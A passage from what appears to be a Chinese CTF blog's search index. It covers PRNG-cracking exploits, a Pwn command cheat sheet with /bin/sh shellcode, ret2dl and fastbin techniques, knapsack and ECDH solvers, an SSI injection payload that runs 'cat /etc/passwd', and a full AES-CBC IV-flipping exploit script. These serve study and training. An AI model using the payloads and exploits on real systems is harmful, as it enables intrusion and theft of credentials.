v2v3_get=int(raw_input())if v3_get==v3: print flag 123456789import java.util.Random;public class Main &#123; public static void main(String[] args) &#123; Random random = new Random(); System.out.println(random.nextInt()); System.out.println(random.nextInt()); System.out.println(random.nextInt()); &#125;&#125; exp123456789101112131415161718192021# from:https://www.cnblogs.com/kagari/p/11304319.htmlimport socket import randomimport timedef liner (seed): return ((seed*25214903917+11)&amp;0xffffffffffff)while True: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) host = '47.97.215.88' port = 20001 s.connect((host, port)) v1=int(s.recv(1024)) v2=int(s.recv(1024)) for i in range(65536): seed=v1*65536+i if liner(seed)&gt;&gt;16==v2: print seed v3=liner(liner(seed))&gt;&gt;16 s.send(str(v3)+'\n') print s.recv(1024) Level 2: Mersenne TwisterBasic knowledge Ruby’s rand()，Pythons random module，PHP’s mt_rand()State：624 32 bit words (integers)624 states -&gt; 624 next states State-&gt;Number(32 bits)123456currentIndex++; int tmp = state[currentIndex]; tmp ^= (tmp &gt;&gt;&gt; 11); tmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680; tmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000; tmp ^= (tmp &gt;&gt;&gt; 18); return tmp; Reverse 1234value = unBitshiftRightXor(value, 18);value = unBitshiftLeftXor(value, 15, 0xefc60000);value = unBitshiftLeftXor(value, 7, 0x9d2c5680);value = unBitshiftRightXor(value, 11); State-&gt;New State12345678910int[] state;for (i = 0; i &lt; 624; i++) &#123;int y = (state[i] &amp; 0x80000000) + (state[(i + 1) % 624] &amp; 0x7fffffff);int next = y &gt;&gt;&gt; 1;next ^= state[(i + 397) % 624];if ((y &amp; 1L) == 1L) &#123; next ^= 0x9908b0df; &#125;state[i] = next;&#125; Useful lib http://47.97.215.88/hardrpd/ Jarvis OJ [xman2019]hardrpd服务器端代码1234567891011121314151617181920212223class Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr)import syssys.stdout = Unbuffered(sys.stdout)import osos.chdir("/root/level2")from random import *while 1: a=raw_input("#") target=getrandbits(32) if a!=str(target): print target else: print open("flag","rb").read() exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# from:https://www.cnblogs.com/kagari/p/11304319.html#coding=utf-8import socket import randomimport timedef unBitshiftRightXor (value,shift): i = 0 result = 0 while i * shift &lt; 32: partMask = right((-1 &lt;&lt; (32 - shift)) , (shift * i)) part = value &amp; partMask value ^= right(part , shift) result |= part i+=1 return resultdef unBitshiftLeftXor(value, shift, mask): i = 0; result = 0; while i * shift &lt; 32: partMask = right(-1 , (32 - shift)) &lt;&lt; (shift * i) part = value &amp; partMask value ^= (part &lt;&lt; shift) &amp; mask result |= part i += 1 return resultdef rev(nums): state=[] for i in nums: value = i; value = unBitshiftRightXor(value, 18) value = unBitshiftLeftXor(value, 15, 0xefc60000) value = unBitshiftLeftXor(value, 7, 0x9d2c5680) state.append(unBitshiftRightXor(value, 11)) return statedef sign(iv): if(iv&amp;0x80000000): iv = -0x100000000 + iv return ivdef nextState(state): for i in range(624): y = (state[i] &amp; 0x80000000) + (state[(i + 1) % 624] &amp; 0x7fffffff) next = right(y,1); next ^= state[(i + 397) % 624] if ((y &amp; 1L) == 1L): next ^= 0x9908b0df state[i] = nextdef nextNumber(state): currentIndex=0 tmp = state[currentIndex]; tmp ^= right(tmp , 11) tmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680 tmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000 tmp ^= right(tmp , 18) return tmpdef right(n,bit): #python没有&gt;&gt;&gt;运算符，这个函数用作代替 x=n if n&lt;0 and bit&gt;0: n=(2147483648*2+n)&gt;&gt;bit else: n=n&gt;&gt;bit return ndef crack_prng(outputs_624_list): state=rev(outputs_624_list) stateList = state[:] nextState(state) r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return r'''#本地测试代码n=[random.getrandbits(32) for i in range(625)]r=crack_prng(n[:-1])print n[-1],r.getrandbits(32)'''n=[]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)host = '47.97.215.88'port = 20002 s.connect((host, port))for i in range(624): print s.recv(1024),i, s.send('\n') n.append(int(s.recv(1024)))r=crack_prng(n)s.send(str(r.getrandbits(32))+'\n')print s.recv(1024),s.recv(1024)]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwn的基本操作]]></title>
    <url>%2F2019%2F07%2F15%2FPwn%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介本文主要是记录一些Pwn的基本操作的命令 基本内容查找gadgets和string123ROPgadget --binary xxx --only 'pop|ret' | grep 'xxx'ROPgadget --binary xxx --string '/bin/sh' ROPgadget --binary xxx --only 'int' execve(“/bin/sh”,NULL,NULL) 的shellcode123456789shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',])) 关闭ASLR1sudo sh -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space" gdb下寻找偏移123pattern create 100pattern offset xxxxxxpattern search objdump读取plt表和got表12objdump -d -j .plt xxxobjdump -R xxx gdb中的print和x1234567print $esp:打印esp的值x/10x $esp：打印出10个从esp开始的值x/10x $esp-4：打印出10个从偏移4开始的值x/10gx $esp：以64位格式打印 readelf查看段地址1readelf -S xxx vmmap查看地址是否可读可写可执行1vmmap one_gadget使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 gdb attach123456from pwnlib import *context.terminal = ['gnome-terminal','-x','sh','-c']context.terminal = ['tmux', 'splitw', '-h']context.terminal = ['tmux', 'splitw', '-v']gdb.attach(p) gdb中算fmt的偏移x(“%x-1$s”)1fmtarg 0x00007fffffffdb28 fmtstr_payload的使用1payload = fmtstr_payload(offset, &#123;puts_got: system_addr&#125;) x64和x86函数调用参数规则12在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈.在x86下其参数从右往左入栈 readelf查看libc版本1readelf -a xxx ret2dl使用12345678910111213141516171819202122232425from roputils import *#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROProp = ROP('./level4') #ROP继承了ELF类，下面的section, got, plt都是调用父类的方法bss_addr = rop.section('.bss')read_got = rop.got('read')read_plt = rop.plt('read')offset = 140io = Proc(host = '172.17.0.2', port = 10001) #roputils中这里需要显式指定参数名buf = rop.fill(offset) #fill用于生成填充数据buf += rop.call(read_plt, 0, bss_addr, 0x100) #call可以通过某个函数的plt地址方便地进行调用buf += rop.dl_resolve_call(bss_addr+0x20, bss_addr) #dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处io.write(buf)然后我们直接用dl_resolve_data生成伪造的link_map并发送buf = rop.string('/bin/sh') buf += rop.fill(0x20, buf) #如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度buf += rop.dl_resolve_data(bss_addr+0x20, 'system') #dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名buf += rop.fill(0x100, buf)io.write(buf) 使用libc里面的函数1234from ctypes import *libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")libc.srand(1) pwntools自动获取libc12345678910111213141516from pwn import *elf=ELF("level3")main_addr=0x08048484plt_write=elf.plt["write"]def leak(address): p.recvline() payload = "A" * 0x88 + "A" * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4) p.send(payload) data=p.recv(4) print hex(u32(data)) print "%#x =&gt; %s" % (address,(data or '').encode('hex')) return datap=process("./level3")d=DynELF(leak,elf=ELF("./level3"))system_addr=d.lookup('system','libc')print "system_addr="+hex(system_addr) 更改程序的libc12345678910111213141516171819202122232425262728293031323334353637def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)#exampleelf = change_ld('./pwn', './ld.so')p = elf.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;) 交互函数123456789sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y) libc寻找字符串1libc.search('/bin/sh').next() libc-2.23中fashbin_attack改malloc_hook12p64(malloc_hook-0x18+5)'\x00'*3+p64(one_gadget) libc-2.23中fastbin_attack改realloc_hook和malloc_hook12p64(malloc_hook-0x23)'1'*0xb+p64(one_gadget)+p64(realloc+offset)]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 TAMUCTF Crypto]]></title>
    <url>%2F2019%2F03%2F01%2F2019-TAMUCTF-Crypto%2F</url>
    <content type="text"><![CDATA[简介2019的TAMUCTF总体来说比较适合入门CTF，题目难度不算太高，不过密码的这两道题也算是我没有怎么接触过的加密，分别是背包加密和ECDH。 Holey Knapsack题目描述 My knapsack has a hole in itCipher text: 11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9Public key: {99, 1235, 865, 990, 5, 1443, 895, 1477}The flag is slightly off format.Difficulty: medium 解题思路通过题目我们也可以知道这是背包加密的题目，背包加密在提出后被发现明显的数学缺陷，从而并未成为实用的加密方式。具体的加密过程和攻击方法详见CTF wiki 解题代码可以直接使用wiki中的代码，不过注意的是encoded需要将密文分组分别读入，4个16进制数为一组 12345678910111213141516171819202122232425262728293031323334353637import binascii# open the public key and strip the spaces so we have a decent arrayfileKey = open("pub.Key", 'rb')pubKey = fileKey.read().replace(' ', '').replace('L', '').strip('[]').split(',')nbit = len(pubKey)# open the encoded messagefileEnc = open("enc.txt", 'rb')encoded = fileEnc.read().split(" ")for e in encoded: # create a large matrix of 0's (dimensions are public key length +1) A = Matrix(ZZ, nbit + 1, nbit + 1) # fill in the identity matrix for i in xrange(nbit): A[i, i] = 1 # replace the bottom row with your public key for i in xrange(nbit): A[i, nbit] = pubKey[i] # last element is the encoded message A[nbit, nbit] = -int(e) res = A.LLL() for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print i, M M = ''.join(str(j) for j in M) # remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print M 参考资料https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/knapsack/knapsack/https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaichttps://nrich.maths.org/2199 Mike’s Marvelous Mystery Curves题目描述 Mike, the System Administrator, thought it would be a good idea to implement his own Elliptic Curve Diffie Hellman key exchange using unnamed curves to use across the network. We managed to capture network traffic of the key exchange along with an encrypted file transfer. See if you can read the contents of that file.Note: The password to the AES192-CBC encrypted file is the shared key x and y coordinates from the key exchange concatenated together. (e.g. sharedKey = (12345,67890) password = “1234567890”)Difficulty: hardEdit: 02/23/2019 14:33 Changed AES256-CBC to AES192-CBC 解题思路题目给了pcap包，从里面可以提取两张证书和文件，证书是用于ECDH密钥交换的，其中比较有用的部分如下： 1234567891011121314151617Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: 196393473219 35161195210 ASN1 OID: badPrime96v4 CURVE: JustNo Field Type: prime-field Prime: 412220184797 A: 10717230661382162362098424417014722231813 B: 22043581253918959176184702399480186312 Generator: 56797798272 349018778637 1234567891011121314151617Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: 61801292647 228288385004 ASN1 OID: badPrime96v4 CURVE: JustNo Field Type: prime-field Prime: 412220184797 A: 10717230661382162362098424417014722231813 B: 22043581253918959176184702399480186312 Generator: 56797798272 349018778637 其中ASN1 OID: badPrime96v4说明我们应该攻击这个weak curve，并且我们可以得到椭圆曲线的信息，包括M、A、B以及P： 1234M = 412220184797A = 10717230661382162362098424417014722231813B = 22043581253918959176184702399480186312P = (56797798272,349018778637) 从Public-Key我们可以获得Q1和Q2： 12Q1 = (61801292647,228288385004)Q2 = (196393473219,35161195210) 则我们可以通过Pohlig-Hellman攻击进行攻击，具体参照这篇文章。从而我们可以得到交换的密钥，最后通过aes-192-cbc解密文件 解题代码sage脚本解出交换的密钥： 123456789101112131415161718192021222324252627M = 412220184797A = 10717230661382162362098424417014722231813B = 22043581253918959176184702399480186312P = (56797798272,349018778637)Q1 = (61801292647,228288385004)Q2 = (196393473219,35161195210)F = FiniteField(M)E = EllipticCurve(F,[A,B])P = E.point(P)Q1 = E.point(Q1)Q2 = E.point(Q2)factor(P.order())primes = [8, 3, 1123, 5098207] #The result is from factor(P.order())dlogs = []for fac in primes: t = int(P.order()) / int(fac) dlog = discrete_log(t*Q1,t*P,operation="+") dlogs += [dlog] print("factor"+str(fac)+", Discrete log:"+str(dlog))x = crt(dlogs,primes)print(x*Q2) #Get the (x,y) 然后将x与y拼在一起得到aes的key，之后解密aes-192-cbc就可以得到结果 参考资料https://www.anquanke.com/post/id/159893https://wstein.org/edu/2010/414/projects/novotney.pdfhttps://wiki.openssl.org/index.php/Elliptic_Curve_Diffie_Hellman#ECDH_and_Named_Curveshttps://wiki.openssl.org/index.php/Elliptic_Curve_Diffie_Hellman#Using_ECDH_in_OpenSSL]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
        <tag>ECC</tag>
        <tag>Knapsack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Server-Side Includes (SSI) Injection]]></title>
    <url>%2F2019%2F01%2F27%2FServer-Side-Includes-SSI-Injection%2F</url>
    <content type="text"><![CDATA[简介 SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。SSI是用于向HTML页面提供动态内容的Web应用程序上的指令。 它们与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI。 可在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。Server-Side Includes攻击允许通过在HTML页面中注入脚本或远程执行任意代码来利用Web应用程序。 一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。 主要用途1、显示服务器端环境变量&lt;#echo&gt;2、将文本内容直接插入到文档中&lt;#include&gt;3、显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)高级SSI可设置变量使用if条件语句 基本格式&lt;!-– 指令名称=”指令参数”&gt;比如： 123&lt;!--#exec cmd="cat /etc/passwd"--&gt;&lt;!--#include file="included.html" --&gt;&lt;!--#echo reqheader="referer" --&gt; 说明:1．是HTML语法中表示注释，当WEB服务器不支持SSI时，会忽略这些信息。2．#exec 为SSI指令之一。3．cmd 为exec的参数, cat /etc/passwd为参数值，在本指令中指将要执行的命令。 注意: 1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。2．上面的标点=””，一个也不能少。3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。 因此，如果网站存在SSI漏洞的时候就会能够执行该命令来查看系统口令。 使用环境什么情况下服务器可以解析shtml文件呢？以Apache Httpd为例，开启SSI需要支持include这个module： 1LoadModule include_module /usr/lib/apache2/modules/mod_include.so1 同时，在配置Web目录的时候，还要使用 +Includes 指令开启这个功能 1234&lt;Directory /var/www/&gt; Options -Indexes +Includes AllowOverride All &lt;/Directory&gt; 另外，如果要SSI要支持exec命令，还需要开启cgi或cgid 123LoadModule cgid_module /usr/lib/apache2/modules/mod_cgid.so # 或者 LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so 此时，我们上传的shtml即可成功利用 摘要该文章主要从P神的知识星球和该博客进行搬运，如有不妥可联系我进行删除]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON Quals 2017 - Secret Server]]></title>
    <url>%2F2019%2F01%2F25%2FHITCON-Quals-2017-Secret-Server%2F</url>
    <content type="text"><![CDATA[该WP是对此WP的学习和补充，也顺便搬运一下 题目信息 AES is unbreakable. Right?We are given this python script. 解题思路Server源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import os, base64, time, random, stringfrom Crypto.Cipher import AESfrom Crypto.Hash import *key = os.urandom(16)def pad(msg): pad_length = 16-len(msg)%16 return msg+chr(pad_length)*pad_lengthdef unpad(msg): return msg[:-ord(msg[-1])]def encrypt(iv,msg): msg = pad(msg) cipher = AES.new(key,AES.MODE_CBC,iv) encrypted = cipher.encrypt(msg) return encrypteddef decrypt(iv,msg): cipher = AES.new(key,AES.MODE_CBC,iv) decrypted = cipher.decrypt(msg) decrypted = unpad(decrypted) return decrypteddef send_msg(msg): iv = '2jpmLoSsOlQrqyqE' encrypted = encrypt(iv,msg) msg = iv+encrypted msg = base64.b64encode(msg) print msg returndef recv_msg(): msg = raw_input() try: msg = base64.b64decode(msg) assert len(msg)&lt;500 decrypted = decrypt(msg[:16],msg[16:]) return decrypted except: print 'Error' exit(0)def proof_of_work(): proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in xrange(20)]) digest = SHA256.new(proof).hexdigest() print "SHA256(XXXX+%s) == %s" % (proof[4:],digest) x = raw_input('Give me XXXX:') if len(x)!=4 or SHA256.new(x+proof[4:]).hexdigest() != digest: exit(0) print "Done!" returnif __name__ == '__main__': proof_of_work() with open('flag.txt') as f: flag = f.read().strip() assert flag.startswith('hitcon&#123;') and flag.endswith('&#125;') send_msg('Welcome!!') while True: try: msg = recv_msg().strip() if msg.startswith('exit-here'): exit(0) elif msg.startswith('get-flag'): send_msg(flag) elif msg.startswith('get-md5'): send_msg(MD5.new(msg[7:]).digest()) elif msg.startswith('get-time'): send_msg(str(time.time())) elif msg.startswith('get-sha1'): send_msg(SHA.new(msg[8:]).digest()) elif msg.startswith('get-sha256'): send_msg(SHA256.new(msg[10:]).digest()) elif msg.startswith('get-hmac'): send_msg(HMAC.new(msg[8:]).digest()) else: send_msg('command not found') except: exit(0) 首先阅读源码，我们可以发现服务器大概有以下几个功能1.get-flag，get-md5, get-sha1, get-sha256, get-hmac,get-time.分别会返回如它们名字的东西2.如果发送的命令不在1中，则返回command not found3.服务器会在一开始给我们一个AES加密字符串Welcome!!的密文以及IV 当然服务器并没有给我们AES加密的key，并且我们发送给服务器的命令是需要在AES解密之后才能执行的。执行条件也就是用明文头匹配功能1中的功能，如果是get-md5,get-sha1等命令会把明文的剩下部分当作参数进行操作。 我们也可以从源码中获取几点有用的信息：1.flag以hitcon{开头，以}结尾2.我们知道一开始给的加密的Welcome!!的IV以及加密后的结果3.unpad方法只是单纯的截取字符，并没有进行检查。我们可以控制截取字符4.AES加密的形式是CBC AES CBC解密原理如下图 1 我们来分析以下左边的第一个块，即开头的块。假设密文C0经过key解密之后的中间值为X0，X0异或IV之后的结果为P0，则我们可以得到： X0 ^ IV = P0 如果我们需要将解密之后的结果改为P1，我们可以这么做 X0 ^ IV ^ P0 = 1X0 ^ IV ^ P0 ^ P1 = P1X0 ^ (IV ^ P0 ^ P1) = P1 也就是将IV异或P0再异或P1就可以了 我们可以将此方法抽象出来供后面使用: 12345678def xor_str(s1, s2): '''XOR between two strings. The longer one is truncated.''' return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(s1, s2))def flipiv(oldplain, newplain, iv): '''Modifies an IV to produce the desired new plaintext in the following block''' flipmask = xor_str(oldplain, newplain) return xor_str(iv, flipmask) 在这道题中我们的P0对应Welcome!!，P1我们可以设为get-flag，则我们可以先获取get-flag命令的返回值 12345678910111213141516171819HOST = '52.193.157.19'PORT = 9999welcomeplain = pad('Welcome!!')p = remote(HOST, PORT)solve_proof(p)# get welcomewelcome = p.recvline(keepends=False)print 'Welcome:', welcomewelcome_dec = base64.b64decode(welcome)welcomeblocks = blockify(welcome_dec, 16)# get encrypted flagpayload = flipiv(welcomeplain, 'get-flag'.ljust(16, '\x01'), welcomeblocks[0])payload += welcomeblocks[1]p.sendline(base64.b64encode(payload))flag = p.recvline(keepends=False)print 'Flag:', flag 我们得到了解密后的flag，但是这显然是不够的，我们需要获得解密后的flag 现在回过头看看我们知道的东西，我们知道flag是以hitcon{开头的。那么如果我们用上一步的方法，将hitcon{换为相同长度的get-md5，会发生什么呢？ command: get-md5XXX 其中XXX为除去hitcon{开头的flag，也就是得到剩下的flag的md5加密之后的结果再进行AES加密的结果 1234567flag_dec = base64.b64decode(flag)flagblocks = blockify(flag_dec, 16)flaglen = len(flag_dec) - 16payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16,'\x00'), flagblocks[0])payload += ''.join(flagblocks[1:])other_flag_md5 = p.sendline(base64.b64encode(payload))print 'Other_Flag_MD5:', other_flag_md5 并且由于unpad的不安全性，我们或许可以将flag截取出来前面的几位，这取决于我们想要它的前几位 现在我们需要解决的问题变为了两个:1.如何通过unpad方法截取flag2.截取的flag被md5加密以及AES加密之后我们怎么验证它是多少 首先我们来解决第一个问题。由于AES-CBC模式解密的时候是用前一个密文块去解密后一个密文块的(除了第一个块是用IV)，我们可以将flipiv方法用在之后的块上。比如我们可以在other_flag_md5的基础上在payload后面加上我们一开始得到的welcomeblocks，并用我们运行get-flag命令的方法截断flag，即 1234567891011def getmd5enc(i): '''Returns the md5 hash of the flag cut at index i, encrypted with AES and base64 encoded''' # replace beginning of flag with 'get-md5' payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16, '\x00'), flagblocks[0]) payload += ''.join(flagblocks[1:]) # add a block where we control the last byte, to unpad at the correct length ('hitcon&#123;' + i characters) payload += flipiv(welcomeplain, 'A'*15 + chr(16 + 16 + flaglen - 7 - 1 - i), welcomeblocks[0]) payload += welcomeblocks[1] p.sendline(base64.b64encode(payload)) md5b64 = p.recvline(keepends=False) return md5b64 这样我们就可以截取flag中hitcon{后面的任意位字符了(当然我们可以随便发送给服务器指令，我们便会收到加密后的command not found，可以像利用Welcome!!一样利用它，不过好像也是多此一举) 接下来我们解决第二个问题。我们首先捕捉getmd5enc方法得到的数据 123# get md5 ciphertext for the flag up to index inewmd5 = getmd5enc(i)md5blocks = blockify(base64.b64decode(newmd5), 16) 该题中MD5加密之后的结果都是16位，并且MD5加密无论输入有多长输出都是固定的位数。我们可以一个字符一个字符的爆破MD5值，记为guess_md5。之后我们可以将guess_md5,pad(get-time)以及md5blocks[0]三个参数传入flipiv方法。如果返回command not found则爆破失败，如果获取其他数据则成功。即 1234567891011121314151617181920known_flag = ''for guess in range(256): # locally compute md5 hash guess_md5 = MD5.new(known_flag + chr(guess)).digest() # try to null out the md5 plaintext and execute a command payload = flipiv(guess_md5, 'get-time'.ljust(16, '\x01'), md5blocks[0]) payload += md5blocks[1] payload += md5blocks[2] # padding block p.sendline(base64.b64encode(payload)) res = p.recvline(keepends=False) # if we receive the block for 'command not found', the hash was wrong if res == notfound: print 'Guess &#123;&#125; is wrong.'.format(guess) # otherwise we correctly guessed the hash and the command was executed else: print 'Found!' known_flag += chr(guess) print 'Flag so far:', known_flag break 最后便可以得到flag:hitcon{Paddin9_15_ve3y_h4rd__!!} 解题脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *import base64, random, stringfrom Crypto.Hash import MD5, SHA256def pad(msg): pad_length = 16-len(msg)%16 return msg+chr(pad_length)*pad_lengthdef unpad(msg): return msg[:-ord(msg[-1])]def xor_str(s1, s2): '''XOR between two strings. The longer one is truncated.''' return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(s1, s2))def blockify(text, blocklen): '''Splits the text as a list of blocklen-long strings''' return [text[i:i+blocklen] for i in xrange(0, len(text), blocklen)]def flipiv(oldplain, newplain, iv): '''Modifies an IV to produce the desired new plaintext in the following block''' flipmask = xor_str(oldplain, newplain) return xor_str(iv, flipmask)def solve_proof(p): instructions = p.recvline().strip() suffix = instructions[12:28] print suffix digest = instructions[-64:] print digest prefix = ''.join(random.choice(string.ascii_letters+string.digits) for _ in xrange(4)) newdigest = SHA256.new(prefix + suffix).hexdigest() while newdigest != digest: prefix = ''.join(random.choice(string.ascii_letters+string.digits) for _ in xrange(4)) newdigest = SHA256.new(prefix + suffix).hexdigest() print 'POW:', prefix p.sendline(prefix) p.recvline()HOST = '52.193.157.19'PORT = 9999welcomeplain = pad('Welcome!!')p = remote(HOST, PORT)solve_proof(p)# get welcomewelcome = p.recvline(keepends=False)print 'Welcome:', welcomewelcome_dec = base64.b64decode(welcome)welcomeblocks = blockify(welcome_dec, 16)# get command-not-foundp.sendline(welcome)notfound = p.recvline(keepends=False)print 'Command not found:', notfound# get encrypted flagpayload = flipiv(welcomeplain, 'get-flag'.ljust(16, '\x01'), welcomeblocks[0])payload += welcomeblocks[1]p.sendline(base64.b64encode(payload))flag = p.recvline(keepends=False)print 'Flag:', flagflag_dec = base64.b64decode(flag)flagblocks = blockify(flag_dec, 16)flaglen = len(flag_dec) - 16known_flag = ''def getmd5enc(i): '''Returns the md5 hash of the flag cut at index i, encrypted with AES and base64 encoded''' # replace beginning of flag with 'get-md5' payload = flipiv('hitcon&#123;'.ljust(16, '\x00'), 'get-md5'.ljust(16, '\x00'), flagblocks[0]) payload += ''.join(flagblocks[1:]) # add a block where we control the last byte, to unpad at the correct length ('hitcon&#123;' + i characters) payload += flipiv(welcomeplain, 'A'*15 + chr(16 + 16 + flaglen - 7 - 1 - i), welcomeblocks[0]) payload += welcomeblocks[1] p.sendline(base64.b64encode(payload)) md5b64 = p.recvline(keepends=False) return md5b64for i in range(flaglen - 7): print '-- Character no. &#123;&#125; --'.format(i) # get md5 ciphertext for the flag up to index i newmd5 = getmd5enc(i) md5blocks = blockify(base64.b64decode(newmd5), 16) # try all possible characters for that index for guess in range(256): # locally compute md5 hash guess_md5 = MD5.new(known_flag + chr(guess)).digest() # try to null out the md5 plaintext and execute a command payload = flipiv(guess_md5, 'get-time'.ljust(16, '\x01'), md5blocks[0]) payload += md5blocks[1] payload += md5blocks[2] # padding block p.sendline(base64.b64encode(payload)) res = p.recvline(keepends=False) # if we receive the block for 'command not found', the hash was wrong if res == notfound: print 'Guess &#123;&#125; is wrong.'.format(guess) # otherwise we correctly guessed the hash and the command was executed else: print 'Found!' known_flag += chr(guess) print 'Flag so far:', known_flag breakprint 'hitcon&#123;' + known_flag 总结还是要谢谢大佬的WP，的确学到挺多东西。虽然本文是搬运并加以理解，但是不得不承认这题还是有点东西的。这题好像还有个Revenge版，等我有时间再研究下ORZ]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 AlexCTF-CR2 Many time secrets]]></title>
    <url>%2F2019%2F01%2F22%2F2017-AlexCTF-CR2-Many-time-secrets%2F</url>
